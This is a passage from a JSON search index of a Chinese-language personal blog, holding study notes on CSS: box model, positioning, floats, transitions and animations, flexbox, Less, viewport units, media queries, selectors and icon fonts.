one,one是w开头（元音字母!=元音）","link":"/English/O/%E7%BE%8E%E5%BC%8F%E5%8F%A3%E8%AF%AD1-7.html"},{"title":"盒子模型与定位","text":"CSSCSS在处理网页时，认为每个元素是一个盒子，网络布局就相当于摆放盒子 边框边框里面由内边距和内容区 设置边框，必须指定三个样式，宽度和颜色和样式 12345678div{ background-color: #008000; width: 100px; height: 100px; border-width:10px ; border-color: #FF0000; border-style:solid ;} 分别设置每个边框的宽度，颜色，样式 123456789101112131415161718/*{上 右 下 左}{上 左右 下}{上下 左右}{上下左右}*//*第一种形式*/div{ border-width: 10px 20px 10px 20px; border-color: red green black blue; border-style: solid double dotted;}/*第二种形式border-x-color/style/widthx为top,left,right,bottom*/div{ border-top-color: red; border-right-style: solid;} style none无边框 solid实线 dotted点状边框 dashed虚线 double双线 简写 1border: 10px solid red; ​ border-x单独设置某边 ​ 指定border就等于同时指定四边 ​ 也可以用border-x:none;取消某边 内边距内容区与边框之间的东西，会影响整个盒子的大小 边距只能设置宽度 123456div{ background-color: #008000; width: 100px; height: 100px; padding-top:10px ;} background-color会填充整个盒子的范围 盒子可见框宽度由内边距，内容区，边框决定 boder-left+padding-left+width+boder-right+padding-right 当盒子（块）宽默认时，padding水平值不会影响盒子宽 简写 12padding: 10px 2em 1;/*更多同border*/ 外边距指与其他元素的间距，不影响盒子可见宽度，元素默认靠左上 当前间距＞设置间距时不变 可指定负值，会朝反方向移动 12margin-top:100px;margin-right: -100px; 水平方向可以设置auto，会将外边距设置为最大值 垂直方向外边距设置为auto，与默认没区别 左右都设置auto，则左右相等，也就是在父元素居中 简写 1margin: 10px 3em 300% 39px; 垂直外边距的重叠 box1和box2是相邻的兄弟元素 123456789101112#box1{ background-color: red; width: 100px; height: 100px; margin-bottom: 100px;}#box2{ background-color: green; width: 100px; height: 100px; margin-top: 100px;} 相邻的兄弟元素外边距重叠时取最大值 相邻的父子元素垂直外边距重叠时，子元素的会传给父元素 但我们一般不想要这种重叠，所以有几个解决方法 方法一 加内容，或用border和padding使其不相邻，但影响可见宽度 或者给父元素加内边距（子元素取消外边距），但影响了可见框，需要控制宽高 方法二 1.相邻的地方加一个table可以阻止相邻(但添加了无用结构) 2.使用:before和display替换成table，类似1的方法(完美方案) 试例代码}/用content添加内容/ 12345/*CSS3 引入 ::before 是为了将伪类和伪元素区别开来。浏览器也接受由CSS 2 引入的 :before 写法*/::before{content:' ';display:table;} 内容区放置子元素的地方 因为浏览器都有一些默认的边框，边距，不利于布局，所以需要清除浏览器默认样式 1234*{margin: 0;padding: 0;} 内联元素的盒子内联元素：span a iframe img 不能设置width和height 可以设置padding-top/bottom，但不会影响布局（会影响显示效果） 可以设置padding-left/right，影响左右 设置border-top/bottom，但不会影响布局（会影响显示效果） 可以设置border-left/right，影响左右 设置margin-left/right，外边距重合时不会重叠，而是相加 不支持垂直margin display和visibility1display: inline; 可以修改元素的类型 值 inline变成行内元素 block变为块元素 inline-block行内块元素（既有宽高，也不换行） table具有表格特征none隐藏元素，且不占位置 1visibility: visible; 值 visible默认值 hidden隐藏，但占位置 overflow 子元素默认是在父元素的内容区的，但子元素如果比父元素大，则默认会显示到父元素外，通过overflow可以控制溢出内容 值 visible默认值 hadden砍掉溢出的 scroll加上滚动条，但不管内容是否溢出 auto根据需求添加scroll] 文档流网页的底层，表示一个页面的位置，创建的元素默认在文档流中 特点 块元素独占一行，自上而下 块元素默认宽度是父元素的100% 默认高度被内容撑开 内联元素在文档中只占自身大小，默认从左到右排列 内联高宽都被内容撑开 float浮动要使块元素水平排列，可以使元素脱离文档流 值 none默认在文档流中 left，right左右浮动 1float: left; 当给元素设置浮动后，元素脱离文档流，位置也会变，尽量像左上和右上移，直到遇到父边界或者其他浮动元素，如果浮动元素上面是一个块元素，则浮不上去，浮动的元素不会超过他上边的兄弟元素，顶多和他对齐 特点 浮动元素不能盖住文字，文字会环绕在浮动元素周围 块元素浮动后高宽默认被文字撑开 内联元素浮动变块元素 高度塌陷浮动元素的缺点就是脱离文档流后父元素的高度塌陷（无法撑开父元素） 若给父元素高度写死，则父元素不会随子元素变化 BFCBlock Formatting Context是w3c的一个隐含环境，默认关闭 特点 父元素和子元素的垂直外边距不会重叠 开启的元素不会被浮动元素覆盖 开启的元素可以包含浮动的元素 设置方法(加下滑线是推荐方式) 1.设置元素浮动 虽然可以撑开父元素，但父元素的宽度塌陷（不会布满父元素，随内容撑开），且影响 布局 2.设置元素绝对定位position 3.设置父（塌陷）元素为inline-block 不会影响布局，但宽度依然塌陷 4.将塌陷元素的overflow设置为非visible 推荐hidden（副作用小，与相对定位冲突） 不兼容IE6 5.clear left right both清除影响大的 6.后塌陷的父元素添加一个空白子块素 通过clear清楚影响，兼容性好，唯一的缺点就是添加多余的结构 示例 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; .box1{ border:10px red solid; } .box2{ width: 100px; height: 100px; background-color: #008000; float:left; } .clear{ clear:both; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;box1&quot;&gt; &lt;div class=&quot;box2&quot;&gt;&lt;/div&gt; &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 7.同6原理，利用:after，给父元素加上:after content必须加””，而且没有多余的结构 代码(以后的元素出现塌陷，只需要加上从class=&quot;clearfix&quot;就行了) 123456.clearfix:after{content:&quot;&quot;;display:block;clear:both;}/*ie6不支持*/ 在IE6中是开启haslayout解决，使用zoom:1，zoom表示放大；或指定一个宽度 定位可以任意访问元素的位置 123456position: static;position: relative;left: 10px;/*相对左边移动*/right: 10px;/*相对右边移动*/top: 10px;/*相对上边移动*/bottom: 10px;/*相对下边移动*/ static默认值 相对定位relative 特点 1.相对是相对原来位置(相对自身移动) 2.相对定位的元素不会脱离文档流 3.会使元素提升一个层级 4.相对定位不会改变元素的性质 5.开启相对定位而不设置偏移量，也不会变化 [new]粘滞定位12position: sticky;top: 0px; 和相对定位差不多 主要特点就是在到达某个位置时固定不动 相对于他的父元素定位 当然因为比较新，所以兼容性不是很好（指IE） 绝对定位absolute 特点 1.绝对定位会使元素脱离文档流 2.需要设置偏移量 3.相对于最近的开启定位的祖先元素定位的(一般开启子元素的absolute要开启父元素的relative)，如果所有的祖先元素都没有定位，就相对于浏览器窗口进行定位 4.提升层次 5.会改变元素性质，内联变块，块变内联 位置 水平布局 left + margin-left + border-left + padding-left + width + padding-right + border-right + margin-left + right = 父元素的内容区 开启绝对定位后，如果过度约束（left=0，right=0） 9个值没有auto则自动调整right使等式满足 有auto则调整auto 因为right和left的默认值时auto，默认会先调整这两个使等式满足 垂直布局 top + margin-top/bottom + padding-top/bottom + bordet-top/bottom + bottom=包含块的高度 同理，top和bottom默认是auto，会先调整这两个 实现双向居中 12345top:0;bottom:0;left:0;right:0;margin:auto; 固定定位fixed（也是绝对定位的一种） 1.固定在浏览器上不随浏览器滚动而滚动 2.与绝对定位不同的是，固定定位永远相对于浏览器窗口定位 怎么设置偏移量? 通过来left right top bottom设置偏移量 通常使用两个就够了，水平一个，垂直一个 元素的层级1z-index:4;/*开启定位才能用*/ 如果定位层级一样，则下面的元素会盖住上面的 但父元素层级再高也不能盖住子元素 z-index（开启定位才能用）代表元素的层级 默认值auto 正值表示离用户越近 负值表示离用户越远 层级高，优先显示 opacity设置元素的透明程度 1opacity: 0.5; 可选值0-1 ie8及以下使用filter:alpha(opacity:0-100)进行透明 1filter:alpha(opacity:50) 背景background-color 设置背景颜色 background-image 1background-image: url(img/1.jpg); 插入图片 url（相对路径） 如果图片大于元素，默认显示左上角 等于就全显示 小于则默认将图片重复平铺充满元素 一般同时指定背景图片和颜色，因为图片加载慢 背景图片默认左上角 background-repeat 设置背景图片重复方式 repeat默认值，双方向重复 no-repeat不重复 repeat-x沿水平方向重复 repeat-y沿垂直方向重复 bacground-position 设置图片开始的位置（相对于父元素） 可以使用right left top botton center的两个来指定一个图片的位置 123background-position: right bottombackground-position: right centerbackground-position: center 也可用x% y%指定 ​ 比如左上0% 0% ​ 左下0% 100% xpx ypx设置偏移量来指定位置 正值向右或下 负值向左或上 如果只设置一个值，则另一个是50% background-attachment 设置背景图片是否跟着页面滚动而滚动 scroll默认值，滚动 fixed固定 设置fixed时，永远相对于浏览器窗口 不随窗口滚动的图片，一般给body 简写 1backgroud: red url(img01.jpg) center fixed no-repead ; 没有顺序和数量要求 注意覆盖 加载闪烁在引入外部文件时，浏览器只会在使用时才会去加载，需要一定时间，会导致闪烁，比如按钮图片 解决方法 整合所有图片成一张图片 使用background-position改变图片位置达到一次加载不闪烁的问题 这种技术叫CSS-Sprite 优点 发送一次请求，加载多个图片 体积小 加载快，提升了用户体验 reset.css清除浏览器样式的css文件 123456789101112131415161718192021222324252627282930313233343536@charset 'utf-8';/*这些元素都建议重新初始化*/body,div,dl,dt,dd,ul,ol,li,tr,td,th,h1,h2,h3,h4,h5,h6,hr,br,img,table,input,form,a,p,textarea{ padding:0; margin:0; font-family:Arial,'Microsoft YaHei','宋体';}/*去掉列表默认排列*/ul,ol,li{ list-style:none;}/*去掉底部横线*//*把a元素更改设置成块级元素，这个根据实际情况决定要不要*/a{ text-decoration:none; display:block;}/*img标签要清除border。*//*display设为block设置为块级元素，默认为display:inline;存在下边线多出4px状况,所以一般设为block*/img{ border:0; display:block;}/*清除浮动破坏带来的塌陷及父子外边距重叠问题*//*清除浮动的兼容IE*/.clearfix { zoom: 1;}.clearfix::after，.clearfix::before { display:table; clear:both; content:&quot;&quot;;} 参考，本人做了一点修改","link":"/Front-end/CSS/2.%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B%E4%B8%8E%E5%AE%9A%E4%BD%8D.html"},{"title":"各种盒子特效","text":"盒子大小1234height: 100px;width: 100px;box-sizing: content-box;box-sizing: border-box; box-sizing：用来设置盒子尺寸的计算方式 属性 content-box：默认值，高度和宽度代表内容区的大小 border-box：宽度和高度代表整个可见框的大小，设置边框宽度和内边距时内容区往里缩，当内边距超过盒子大小才会扩大 normal 默认值 从from到他哦reverse 从to到fromalternate 从from到to 重复执行时反向执行轮廓与圆角 1outline: 10px red solid outline用来设置轮廓线，属性和border一样，区别就是不会影响布局 阴影1box-shadow: 10px 20px 50px rgb(0,0,0,.3); 设置元素的阴影 第一个值是水平偏移量，正值向右，负值向左 第一个值是垂直偏移量，正值向下，负值向上 第三个值，模糊半径 第四个值代表，阴影颜色 圆角 以圆画圆角 1234567891011border-radius: 10px;border-top-left-radius: 10px;border-top-right-radius: 10px;border-bottom-right-radius: 10px;border-bottom-left-radius: 10px;/* 左上/右下 右上/左下 */border-radius: 10px 50px;/* 左上 右上、左下 右下*/border-radius: 10px 30px 50px;/* 左上 右上 右下 左下 */border-radius: 10px 20px 30px 40px; 以椭圆画圆角 12/* 第一个值代表水平半径a，第二个值代表垂直半径b */border-radius: 10px/40px; 圆 12/* 圆形 */border-radius: 50%; 文本垂直对齐12vertical-align: middle;vertical-align: 10px; 文本都是在基线(baseline)上面的，使用vertical-align设置对齐方式 值 正值向上移动，负值向下移动 top：顶部对齐 baseline：默认值，沿基线对齐 bottom：底部对齐 middle：在父元素里居中 主要是这个可以解决图片布局的问题，图片在默认情况下是有基线的，它在父元素里并不会把父元素占满，而是在基线之上，去除这个影响就可以使用这个属性，更改默认值就行了 文本溢出处理当一行文本超过屏幕宽度或指定宽度时，设置处理方式 12345678910/*默认值*/white-space: normal;/* nowrap:不换行 pre：保留格式*//*超出后的范围隐藏*/overflow:hidden;/*显示省略号*/test-over-flow: elipsis; 背景background-clip:裁剪背景 值 border-box:默认值，背景会出现在边框下面 padding-box：背景不会出现在边框，出现在内容区和内边距 content-box：出现在内容区 background-orgin：背景偏移计算的原点 值 padding-box：默认值，position从内边距开始计算 content-box：从内容区计算 border-box：从边框计算 background-size：设置图片大小 第一个值代表宽度，第二个值代表高度 cover：按照图片比例将元素铺满 contain：图片比例不变，在元素中完整显示 简写注意 size必须写在position后面，使用/隔开 orgin和clip必须按照顺序来 1background: center center / cover content-box content-box; 渐变渐变就是将一个颜色向其他颜色进行过渡的效果，需要注意的是，渐变是图片，所以需要使用background-image设置 线性渐变12345678/* 表示从1px/red到30px/green开始渐变 ，默认从上到下*/background-image: linear-gradient( red 1px,green 30px);/* to right/left/top/bottom ,to right bottom */background-image: linear-gradient(to right, rgb(145, 12, 12),green);/* deg表示度，turn表示圈 */background-image: linear-gradient(45deg,red,green);/*平铺，从1-30像素的渐变平铺*/background-image:repeating-linear-gradient(red 1px,green 30px); 径向渐变使用的时候查api，不怎么常用 介绍一下基本语法 1background-image:radial-gradient(大小 at 位置, 颜色 位置,颜色 位置); 过渡1234/*指定属性，all代表所有属性*/transition-property: height,width;/*延迟时间*/transition-duration: 1s,ms; 可以指定一个属性发生变化的切换方式 提升用户体验 过渡的时序函数指定过渡的执行方式 1transition-timing-function: ; 可选值 ease 默认值，加速-&gt; 减速 linear 匀速运动 ease-in 加速运动 ease-out 减速运动 ease-in-out 慢-&gt;加速-&gt;减速 cubic-bezier() 使用贝塞尔曲线 https://cubic-bezier.com/#.49,.5,.48,.51 steps() 分步执行过渡效果 steps(3,end); 第二个值代表时间起始，默认值end表示时间结束，start表示开始时间执行 延迟1transition-delay: 2s; 延迟i执行 简写 第一个时间是持续时间 1transition: 1s 2s ease all; 动画与过渡类似(有它的所有属性)，但不需要用属性触发，是动态的 动画效果必须要设置一个关键帧，代表动画执行的步骤 123456789101112@keyframes test {/* 开始位置，0% */from{width: 100px;height: 100px;}/* 结束位置 ，100%*/to{width: 200px;height: 200px;}} 然后添加动画属性 1234567891011121314151617181920212223242526272829303132333435363738/* 执行的的动画关键帧 */animation-name: test;/* 持续时间 */animation-duration: 2s;/* 指定动画运行的方向 可选值 normal 默认值 从from到他哦 reverse 从to到from alternate 从from到to 重复执行时反向执行 alternate-reverse 从to到from 重复执行时反向执行*/animation-direction: alternate;/* 动画执行次数 可选值 数字 infinite 无限执行*/animation-iteration-count: infinite;/* 延时*/anmation-delay:2s;/* 设置动画执行状态 可选值 running 默认值 动画执行 paused 暂停*/animation-play-state: running;/* 动画填充模式 可选值 none 默认 执行完回到原来位置 forwards 执行后停到结束位置 backwards 动画延时等待时，处于from的位置 both 结合上面两个*/animation-fill-mode: none; 还有时序函数等等，和过渡一样 简写 注意延时和延迟时间顺序即可 第一个代表延迟，第二代表延时 1animation:1s 2s 2 alternate; 变形123transform: translateX(-100px);transform: translateX(50%);/*正值右 下，负值上左*/ 通过css改变元素的形状或位置，不会影响布局 transform用来设置这种效果 平移 translateX() translateY() translateZ(),需要设置视窗大小(perspective)才有用 例子：当元素大小确定时可以使用绝对路径 ，过度约束来居中 但是对于大小不确定的元素，需要变形比较方便，比如 1234position: absolute;left: 50%;top: 50%;transform: translateX(-50%) translateY(-50%); 旋转1transform: rotateY(1turn) translateZ(800px); 指定元素沿着x y z轴旋转的角度（单位deg，turn） rotateX() rotateY() rotateZ() 附一张坐标图 注意旋转和平移的顺序，旋转后坐标轴会变化 是否显示元素背面 12backface-visibility: visible;backface-visibility: hidden; 3d效果要使用transform-style: preserve-3d; 缩放将元素进行缩放和放大 scaleX() 水平缩放 scaleY() 垂直 scale() 双方向 原点变形原点 12transform-orgin:20px 20px;/*默认值center*/ 弹性盒 flex（弹性盒）是CSS的布局手段，是用来代替浮动的 使元素具有弹性，让元素随页面的大小改变而改变 弹性容器12dispaly: flex;dispaly: inline-flex; 设置上面两个其中一个属性就是弹性容器了 flex-direction row 默认值 弹性元素水平排列（左到右） row-reverse 水平反向排列 column 纵向排列 column-reverse 纵向反向排列 主轴：排列方向就是主轴 辅轴：与主轴垂直的方向 flex-wrap 设置元素是否换行 nowarp 默认，不换行 warp 沿辅轴方向换行 warp-reverse 沿辅轴反方向换行 flex-flow warp和direction的简写属性 justify-content 主轴上空白的分布 flex-start 主轴起边排列 flex-end 终边排列 center 主轴中居中排列 space-around 空白分配到元素两侧 space-between 空白均匀分配到元素间，两端没有 space-evenly 空白分配到元素单侧 align-items 辅轴排列元素 stretch 默认 将元素长度设置为相同的值 flex-start 元素不会拉伸 沿辅轴起边对齐 flex-end 沿终边对齐 center 辅轴中居中对齐 baseline 基线对齐 align-content 辅轴空白的分布 flex-start 辅轴起边排列 flex-end 辅轴排列 center 辅轴中居中排列 space-around 空白分配到元素两侧 space-between 空白均匀分配到元素间，两端没有 space-evenly 空白分配到元素单侧 弹性元素 flex-grow 设置伸展系数 定义了元素在多余空间的容器内怎么分布 每个元素都设置时按照比例分配 flex-shrink 收缩系数 当容器不够放下子元素时子元素的变化 1 默认值 等比例收缩 数值越大代表收缩越厉害 align-self 覆盖当前的align-items flex-basis 指定元素在主轴上的基础长度 主轴横向则代表宽度 纵向代表高度 默认auto，根据元素自身 指定数值则以数值为准 flex 简写属性 flex grow shrink basis initial(0 1 auto) auto(1 1 auto) none(0 0 auto) order 指定排列顺序 根据指定值排列顺序","link":"/Front-end/CSS/4.%E5%90%84%E7%A7%8D%E7%9B%92%E5%AD%90%E7%89%B9%E6%95%88.html"},{"title":"简单使用less","text":"为了简化代码而采用的，CSS自带不兼容老浏览器，于是有了less CSS变量和函数12345678910/* define */html{ --varName:200px;}/* 使用 */div{ wdith:var(--varName); /* calc()函数负责计算*/ height:calc(500px/2);} less less是css的增强版，写更少的代码实现更强大的样式 支持变量，mixins.. 语法与css一致，但有许多扩展 浏览器无法直接执行less代码，需要转换工具将less to css 将代码模块化，方便维护与管理 基础语法less源码（只是介绍一些基本的语法） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950//变量声明@a:100px;@a: 200px;@b: img;@c: test;//less行注释/* less，css块注释，会编译到css文件内 */div{ /* 变量直接使用 */ width: @a; /* 引用其他属性 */ height: $width; /* 变量作为部分值的使用 */ background-image: url(&quot;@{b}/1.png&quot;); /* div里的元素样式 */ span{ color: red; } /* &amp;代表外层的父元素 */ &amp;:hover{ color: blue; }}/* 变量作为类名的使用 */.@{c}{ width: @a;}/* 继承div的属性，自己也有独特的属性 */.box:extend(div){ background-color: #bbffaa;}/* mixin 混合 也就是直接对已有样式进行调用*/.box2{ .test();}/* 创建mixins1,不会被编译 */.my-mix(){ border: 2px solid red;}/* 创建mixins2 */.my-mix2(@var1,@var2){ width: @var1; height: @var2;}/* 使用mixins2 */.box3{ .my-mix2(100px, 200px);} 编译的css源码 123456789101112131415161718192021222324252627282930313233343536373839/* less，css块注释，会编译到css文件内 */div,.box { /* 变量直接使用 */ width: 200px; /* 引用其他属性 */ height: 200px; /* 变量作为部分值的使用 */ background-image: url(&quot;img/1.png&quot;); /* div里的元素样式 */ /* &amp;代表外层的父元素 */}div span { color: red;}div:hover { color: blue;}/* 变量作为类名的使用 */.test { width: 200px;}/* 继承div的属性，自己也有独特的属性 */.box { background-color: #bbffaa;}/* mixin 混合 也就是直接对已有样式进行调用*/.box2 { width: 200px;}/* 创建mixins1,不会被编译 *//* 创建mixins2 *//* 使用mixins2 */.box3 { width: 100px; height: 200px;} 此外，less里面的所有数据都可以进行运算 1wdith: 200px +100px; less还给我们提供了很多的函数 引入 相当与将别的less文件内容复制进来 优点就是将代码模块化，比如var.less文件管理变量，mixins.less管理函数.. 方便后期维护管理 1@import &quot;lessFileName&quot;; debug因为在浏览器的开发工具里显示的都是css代码位置，所以需要使用less工具来帮助我们进行调试 更改less的json配置文件把sourceMap改为true即可 再次进入开发者工具显示的就是less代码位置","link":"/Front-end/CSS/5.%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8less.html"},{"title":"CSS里面的像素","text":"像素又分为css像素和物理像素 css像素就是我们在编写网页时用的像素就是css像素 物理像素比如我的电脑分辨率是1920×1200，这就是物理像素 默认情况下，在pc端css与物理像素比是1:1 视口 viewport就是屏幕中用来显示网页的区域 默认情况下1css px=1物理像素 放大两倍时，1css px= 2物理像素 手机视口宽度移动的视口默认是980px（css像素） 使pc端可以在移动端访问，完整显示网页 所以大部分的pc端可以在移动端正常浏览，但体验不好 所以需要为移动端设计一个网页 所以编写移动端网页时，需要一个设置合理的像素比 通过meta设置视口大小 最佳的视口大小称为完美视口，由厂商给出 1&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; vw%是相对于父元素或其他作为参考的 vw是永远相对于视口作为参考的 100vw=视口宽度 1vw=1%的视口宽度","link":"/Front-end/CSS/6.CSS%E9%87%8C%E9%9D%A2%E7%9A%84%E5%83%8F%E7%B4%A0.html"},{"title":"响应式布局","text":"网页可以根据不同的设备或窗口大小呈现不同的效果 使用响应式布局，可以使一个网页适用所有设备 媒体查询 响应式布局的关键就是媒体查询 可以为不同的设备，不同状态分别设置样式 语法@media 查询规则{} 媒体类型 all 所有设备 print 打印设备 screen 屏幕阅读器 speech 屏幕阅读器 为了兼容老浏览器，媒体类型前面要加only 媒体特性 width 视口宽度 heigh 视口高度 min-width 最小宽度（大于时生效） max-height 最大高度 例子 12345@media only screen and (min-width: 500px) and (max-width: 700px){ body{ background-color: #bfa; }}","link":"/Front-end/CSS/7.%E5%93%8D%E5%BA%94%E5%BC%8F%E5%B8%83%E5%B1%80.html"},{"title":"CSS基础","text":"简介层叠样式表Cascading style sheets 可以用来给网页创建样式表，对网页进行修饰 层叠就是多层结构，高的可以覆盖低的 css可以为网页每个层次设置样式 例子 内联样式 1&lt;p style=&quot;color:red;font-size:100px;&quot;&gt;这是一段内容&lt;/p&gt; 在元素的的style属性中编写样式 缺点：相当于表现与**结构耦合**，不易**复用**，不推荐使用 内部样式 通过CSS选择器选中指定样式 12345678&lt;head&gt; &lt;style type=&quot;type/css&quot;&gt; p{ color:red; font-size:100px; } &lt;/style&gt;&lt;/head&gt; 但还是有缺点，那就是只在一个页面起作用 外部样式表 title进一步复用，利用link链接多个网页，方便管理 使用步骤： 1.创建.css文件，内容如下 1234p{ color:red; font-size:100px;} 2.在需要样式的网页头部，引入`.css`文件123&lt;head&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;.css文件路径&quot;/&gt;&lt;/head&gt; 优点：提高网页访问效率（在缓存里访问同一个css文件），完全使结构和表现分离，最大程度进行复用，用我的话讲就是方便维护，减少代码冗余语法 选择器(选择指定元素)+声明块(修饰指定元素) h1{color:red;} 用/*我的注释内容*/注释 常用选择器1.id选择器通过元素的id属性可以选中唯一的一个元素 语法 1#id{} 注意 id不能重复 2.类选择器通过class属性选中一组元素 语法 1.class{} 并且可以用空格设置多个属性值 123&lt;p class=&quot;tag1 tag2&quot;&gt; &lt;/p&gt; 3.并集选择器将选择器分组 语法 1.class1,#id1,p{} 满足一个条件即可 4.通配选择器选择所有元素 1*{} 5.交集选择器 满足所有条件才行 id一般不用这个，因为id可以确定唯一元素 语法 1p.class1.clss2{} 元素之间的关系 父元素：直接包含子元素的元素 子元素：直接被父元素包含的元素 祖先元素：直接或间接包含后代元素的元素 后代元素：直接或间接被祖先元素包含的元素 后代选择器 选中指定指定元素的后代元素，范围大 语法 12#id1 span{}.class1 span span{} 子代选择器 选中指定父元素的子元素 语法 1div &gt; span{} 兼容性 IE6不支持 兄弟选择器 选中指定元素的后面元素 语法 1234/*指定选中紧挨的一个元素*/div + p{}/*选中div后面所有的p元素*/div ~ p{} 其他的选择器伪类选择器 代表访问的状态 未访问的链接 1a:link{} 访问过的链接 12a:visited{}/*因为隐私原因，只可设置color*/ 鼠标滑过链接 1a:hover{} 鼠标点击链接 1a:active{} link visited hover active最好按照顺序写，不然会有的属性冲突不会生效（它们的优先级是一样的 ） 有两个伪类适用于其他标签 12:hover:active :warning: IE6不兼容 文本框获取焦点时的状态 1input:focus{} 选中时的状态，适用于大多浏览器 1::selection{} 火狐要用 1::-moz-selection 伪元素选择器伪元素一般指一些特殊位置 CSS3 引入 ::before 是为了将伪类和伪元素区别开来。浏览器也接受由CSS 2 引入的:before 写法。 12345678:first-letter/*目前发现a,span不能用*/:first-line/*目前发现a,span不能用*/:before{ content:&quot;在元素最前面&quot;;}/*用content添加内容*/:after{ content:&quot;在元素最后面&quot;;}/*用content添加内容*/ ie6不支持 属性选择器每个标签都可以有title=&quot; &quot;这个属性 列举一些常用的 标签名[属性名]{} 标签名[属性名=属性值]{} 标签名[属性名^=某字符] 选择字符开头的属性的标签 标签名[属性名$=某字符] 选择字符结尾的属性的标签 标签名[属性名*=某字符] 选择含有字符的属性的标签 子元素选择器 选择第一个子元素 1tag:first-child{} 选中所有元素里面的第一个tag元素 若该子元素不是第一个，则不选中1tag:last-child{} 1tag:nth-child(x){} 选中所有父元素的x个tag 当x=even时 选择偶数 x=odd 奇数 实例:表格 在元素中选择 1tag:first-of-type{} 在tag中选择第一个，不管谁是tag的父元素12e:last-of-tyoe{}e:nth-of-type(x){} 否定选择器1:not(选择器){} 练习选择器的一个网站 样式的继承 父元素的一些样式会继承给子代 背景样式，边框，定位样式都不会变 是否可以继承可以参考w3cschool网站 选择器的优先级当选择器选中相同的元素时，优先级高的生效 内联样式1000 id选择器100 类和伪类10 元素选择器 通配*0 继承，没有优先级 有多种选择器时，相加比较，但不会超过最大数量级 优先级一样时，用后面的（覆盖） 并集选择器不会相加，单独计算 在样式后面添加!important，优先级最大，开发时建议尽量不用 123p{ color:yellow !important;} 长度单位 px 相当于屏幕的像素点 屏幕好，像素点小（像素多） % 可以根据父元素的大小设置子元素的大小，适用于自适应界面 em 1em=1font-size em可以根据当前字体大小设置长度 rem 相对与根元素字体大小设置 颜色单位RGB红(red)绿(green)蓝(blue)三原色 两种表示方法 rgb(0-255,0-255,0-255) rgb(0-100%,0-100%,0-100%) 用十六进制表示0-255 #+00-ff（red）+00-ff(green)+00-ff(blue) 当有两两重复时可以简写 #ff0000,#f00 RGBA 需要四个值，前三个和RGB一样，第四个代表透明度(0,.5,1) rgb(0,0,0,.54) HSL和HSLA H(hue)：色相（0-360） S(saturation)：饱和度，颜色浓度（0-100%） L(lightness)：亮度，颜色亮度（0-100%） A代表透明度 hsl(100,100%,0.543) 字体 颜色color 字体大小font-size（默认16px） 实际设置的是字体所在的”格” 字体用font-family修改，可使用多种字体用,隔开，优先最前面的 font-style设置字体风格 italic，oblique，normal font-weight设置字体粗细 normal，bold，bolder，lighter，100-900 font-variant小型字母大写 normal small-caps（大写字母缩小） 快速设置字体的多种样式，简写 123p{ font:italic bold 20px &quot;字体&quot;; } **文字的大小和字体必须写，并且大小和字体必须最后按顺序写** **优点**：加载性能好 字体分类 serifsans-serifmonospacecursivefantasy 一般作为最后一个字体 从服务器里加载字体 1234567@font-face{ /* 指定字体名 */ font-family:&quot;fontName&quot;; /* 路径 */ src: url(&quot;./font/font.ttf&quot;)， url();} 以后可以直接使用fontName字体 缺点：加载速度，版权 [new]图标字体（iconfont） 【百度百科】矢量图是根据几何特性来绘制图形，矢量可以是一个点或一条线，矢量图只能靠软件生成，文件占用内在空间较小，因为这种类型的图像文件包含独立的分离图像，可以自由无限制的重新组合。它的特点是放大后图像不会失真，和分辨率无关，适用于图形设计、文字设计和一些标志设计、版式设计等 网页一些小的图标如果使用图片的话比较麻烦，而且图片比较大，不灵活 而字体是矢量图，不会失真，于是可以把这些图标做成矢量图 使用引入字体的形式来使用这些图标 fontawesome使用步骤 官网下载，大陆可能比较慢，找梯子爬吧 解压 将css和webfonts放在一起移动到项目 将all.css引入网页 查api文档使用图标 fab和fas免费 举几个例子 12345678910&lt;!--head--&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;./fontawesome/css/all.css&quot;&gt;&lt;!-- body --&gt;&lt;div style=&quot;font-size: 2rem;&quot;&gt; &lt;div&gt;&lt;i class=&quot;fas fa-home fa-fw&quot; style=&quot;background:MistyRose&quot;&gt;&lt;/i&gt; Home&lt;/div&gt; &lt;div&gt;&lt;i class=&quot;fas fa-info fa-fw&quot; style=&quot;background:MistyRose&quot;&gt;&lt;/i&gt; Info&lt;/div&gt; &lt;div&gt;&lt;i class=&quot;fas fa-book fa-fw&quot; style=&quot;background:MistyRose&quot;&gt;&lt;/i&gt; Library&lt;/div&gt; &lt;div&gt;&lt;i class=&quot;fas fa-pencil-alt fa-fw&quot; style=&quot;background:MistyRose&quot;&gt;&lt;/i&gt; Applications&lt;/div&gt; &lt;div&gt;&lt;i class=&quot;fas fa-cog fa-fw&quot; style=&quot;background:MistyRose&quot;&gt;&lt;/i&gt; Settings&lt;/div&gt;&lt;/div&gt; 其他用法 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; li::before{ /* 图标编码 */ content: &quot;\\f1b0&quot;; /* 使用编码的其他设置，在.css文件里面找使用的字体族，其他属性也要写上才会生效 */ font-family: 'Font Awesome 5 Free'; font-weight: 900; } &lt;/style&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./fontawesome/css/all.css&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;ul&gt; &lt;li&gt;test&lt;/li&gt; &lt;li&gt;test&lt;/li&gt; &lt;li&gt;test&lt;/li&gt; &lt;li&gt;test&lt;/li&gt; &lt;/ul&gt; &lt;!-- 通过实体来使用图标 ，class这个类引入字体族及特殊属性，后面的&amp;#x;代表十六进制编码，可以去api文档查询--&gt; &lt;span class=&quot;fas&quot;&gt;&amp;#xf1b0;&lt;/span&gt;&lt;/body&gt;&lt;/html&gt; 阿里的图标库 